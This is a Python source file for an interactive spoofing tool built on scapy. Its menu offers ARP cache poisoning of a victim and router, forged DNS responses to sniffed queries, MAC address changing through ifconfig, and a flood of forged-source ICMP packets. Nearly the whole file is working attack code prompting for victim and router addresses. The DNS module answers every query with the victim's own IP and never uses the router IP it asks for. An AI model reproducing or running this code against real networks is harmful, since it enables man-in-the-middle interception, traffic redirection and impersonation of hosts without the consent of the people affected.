import scapy.all as scapy
import sys
import time
import os
from colorama import init, Fore, Back, Style
import threading
import subprocess
import logging
import json

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Load configuration
with open('config.json', 'r') as config_file:
    config = json.load(config_file)

def installingReq():
    pass

class loadingScreens():
    def __init__(self, choice):
        if choice == 1:
            self.initializing()

    def initializing(self):
        words = [
    "[+] Initializing",
    "[+] iNitializing",
    "[+] inItializing",
    "[+] iniTializing",
    "[+] initIalizing",
    "[+] initiAlizing",
    "[+] initiaLizing",
    "[+] initialIzing",
    "[+] initialiZing",
    "[+] initializIng",
    "[+] initializiNg",
    "[+] initializinG"
]
        for i in range(2):
            for word in words:
                print(f"\r{word}", end="")
                time.sleep(0.3)

        print("\n")

# ARP Spoofing Module
class ARP_SPOOFING:
    def __init__(self, victim_ip=None, router_ip=None):
        self.victim_ip = victim_ip or self.ask_input('Victim IP Address', config['victim_ip'])
        self.router_ip = router_ip or self.ask_input('Router IP Address', config['router_ip'])
        self.sent_packet_count = 0

    def start(self):
        self.start_arp_spoofing()

    def ask_input(self, prompt, default):
        return input(f"[{prompt}] (default: {default}) >>> ") or default

    def start_arp_spoofing(self):
        try:
            while True:
                self.sent_packet_count += 2
                self.arp_spoof(self.victim_ip, self.router_ip)
                self.arp_spoof(self.router_ip, self.victim_ip)
                logging.info(f"Packets sent: {self.sent_packet_count}")
                time.sleep(2)
        except KeyboardInterrupt:
            logging.info("Stopping ARP Spoofing...")

    def arp_spoof(self, target_ip, spoof_ip):
        arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip), psrc=spoof_ip)
        scapy.send(arp_packet)

    def get_mac(self, ip):
        arp_req = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_req_broadcast = broadcast/arp_req
        ans = scapy.srp(arp_req_broadcast, timeout=2, verbose=False)[0]
        return ans[0][1].hwsrc

# DNS Spoofing Module
class DNS_SPOOFING:
    def __init__(self):
        self.victim_ip, self.router_ip = self.ask_input()
        self.start_dns_spoofing()

    def ask_input(self):
        victim_ip = input(f"[Victim IP Address] (default: {config['victim_ip']}) >>> ") or config['victim_ip']
        print("\r")
        router_ip = input(f"[Router IP Address] (default: {config['router_ip']}) >>> ") or config['router_ip']
        print("\r")
        return victim_ip, router_ip

    def start_dns_spoofing(self):
        try:
            logging.info("Starting DNS Spoofing...")
            scapy.sniff(filter="udp port 53", prn=self.process_packet, store=False)
        except Exception as e:
            logging.error(f"Error: {e}")

    def process_packet(self, packet):
        if packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 0:
            spoofed_packet = self.spoof_dns_response(packet)
            scapy.send(spoofed_packet)
            logging.info(f"Spoofed DNS response sent to {packet[scapy.IP].src}")

    def spoof_dns_response(self, packet):
        ip_layer = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
        udp_layer = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)
        dns_layer = scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd, an=scapy.DNSRR(rrname=packet[scapy.DNSQR].qname, ttl=10, rdata=self.victim_ip))
        return ip_layer/udp_layer/dns_layer

# MAC Spoofing Module
class MAC_SPOOFING:
    def __init__(self):
        self.interface, self.new_mac = self.ask_input()
        self.original_mac = self.get_current_mac(self.interface)
        self.change_mac(self.interface, self.new_mac)

    def ask_input(self):
        interface = input(f"[Network Interface] (default: {config['network_interface']}) >>> ") or config['network_interface']
        print("\r")
        new_mac = input(f"[New MAC Address] (default: {config['new_mac']}) >>> ") or config['new_mac']
        print("\r")
        return interface, new_mac

    def get_current_mac(self, interface):
        result = subprocess.check_output(["ifconfig", interface])
        return self.extract_mac(result)

    def extract_mac(self, ifconfig_result):
        import re
        mac_address_search = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
        if mac_address_search:
            return mac_address_search.group(0)
        else:
            logging.error("Could not read MAC address.")
            return None

    def change_mac(self, interface, new_mac):
        logging.info(f"Changing MAC address for {interface} to {new_mac}")
        subprocess.call(["ifconfig", interface, "down"])
        subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
        subprocess.call(["ifconfig", interface, "up"])

    def restore_mac(self):
        logging.info(f"Restoring original MAC address for {self.interface}")
        self.change_mac(self.interface, self.original_mac)

# IP Spoofing Module
class IP_SPOOFING:
    def __init__(self):
        self.target_ip, self.spoofed_ip = self.ask_input()
        self.start_ip_spoofing()

    def ask_input(self):
        target_ip = input(f"[Target IP Address] (default: {config['victim_ip']}) >>> ") or config['victim_ip']
        print("\r")
        spoofed_ip = input(f"[Spoofed IP Address] (default: {config['spoofed_ip']}) >>> ") or config['spoofed_ip']
        print("\r")
        return target_ip, spoofed_ip

    def start_ip_spoofing(self):
        try:
            logging.info("Starting IP Spoofing...")
            packet = self.craft_spoofed_packet(self.target_ip, self.spoofed_ip)
            scapy.send(packet, loop=1, inter=1)
        except Exception as e:
            logging.error(f"Error: {e}")

    def craft_spoofed_packet(self, target_ip, spoofed_ip):
        ip_layer = scapy.IP(src=spoofed_ip, dst=target_ip)
        icmp_layer = scapy.ICMP()
        return ip_layer/icmp_layer

def banner():
    print("""
         _____                   ____         
        / ___/____  ____  ____  / __/__  _____
        \__ \/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
         ___/ / /_/ / /_/ / /_/ / __/  __/ /    
        /____/ .___/\____/\____/_/  \___/_/     
            /_/                                 

        Author: SHAWN MICHAEL SUDARIA
        Version: 1.0
         
        """)
    
def main():
    os.system('cls||clear')
    loadingScreens(1)
    os.system('cls||clear')
    banner()
    print("""
    Choose:
          1. ARP Spoofing
          2. DNS Spoofing
          3. MAC Address Spoofing
          4. IP Address Spoofing
          h. Help
          q. Quit
    \n\n""")
    choice = input("spf>>> ")
    if(choice == "1"):
        os.system("cls||clear")
        banner()
        arpS = ARP_SPOOFING()
        arpS.start()
    elif(choice == "2"):
        os.system("cls||clear")
        banner()
        dnsS = DNS_SPOOFING()
    elif(choice == "3"):
        os.system("cls||clear")
        banner()
        macS = MAC_SPOOFING()
    elif(choice == "4"):
        os.system("cls||clear")
        banner()
        ipS = IP_SPOOFING()
    elif(choice.lower() == "h"):
        print("Help: Choose an option to perform the corresponding spoofing technique. Default values are loaded from config.json.")
    elif(choice.lower() == "q"):
        exit()
    
if __name__ == "__main__":
   main() 
